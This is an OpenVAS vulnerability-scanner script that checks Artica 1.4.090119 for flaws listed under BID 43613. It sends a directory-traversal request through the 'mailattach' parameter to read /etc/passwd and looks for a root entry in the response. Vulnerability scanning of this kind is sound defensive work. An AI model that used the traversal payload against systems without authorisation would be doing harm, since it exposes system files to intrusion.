###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_artica_43613.nasl 14 2013-10-27 12:33:37Z jan $
#
# Artica Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Artica is prone to multiple security vulnerabilities including directory-
traversal vulnerabilities, security-bypass vulnerabilities, an SQL-
injection issue, and an unspecified cross-site scripting issue.

Successfully exploiting the directory-traversal issues allows
attackers to view arbitrary local files and directories within the
context of the webserver.

Attackers can exploit the SQL-injection issue to carry out
unauthorized actions on the underlying database.

Successfully exploiting the security-bypass issues allows remote
attackers to bypass certain security restrictions and perform
unauthorized actions.

Attackers can exploit the cross-site scripting issue to execute
arbitrary script code in the browser of an unsuspecting user in the
context of the affected site. This may let the attacker steal cookie-
based authentication credentials or launch other attacks.

Artica 1.4.090119 is vulnerable; other versions may also be affected.";

tag_solution = "The vendor released a patch. Please see the references for more
information.";

if (description)
{
 script_id(100871);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-10-26 13:33:58 +0200 (Tue, 26 Oct 2010)");
 script_bugtraq_id(43613);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_name("Artica Multiple Security Vulnerabilities");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/43613");
 script_xref(name : "URL" , value : "http://www.artica.fr/index.php/get-a-download-artica/nightly-builds");
 script_xref(name : "URL" , value : "http://www.artica.fr/");

 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if Artica is prone to multiple security vulnerabilities");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("gb_artica_detect.nasl");
 script_require_ports("Services/www", 9000);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("openvas-https.inc");
include("global_settings.inc");
   
port = 9000;

if(!get_port_state(port))exit(0);
if(!get_kb_item(string("www/", port, "/artica")))exit(0);

traversal = make_list(crap(data:"../",length:3*10),crap(data:"....//",length:5*6));   

foreach trav (traversal) {
   
  req = string("GET /images.listener.php?mailattach=",trav,"etc/passwd HTTP/1.1\r\nHost: ",get_host_name(),"\r\n");
  buf = https_req_get(port:port,request:req);

  if(egrep(pattern:"root:.*:0:[01]:",string:buf)) {
    security_warning(port:port);
    exit(0);
  }
}
exit(0);

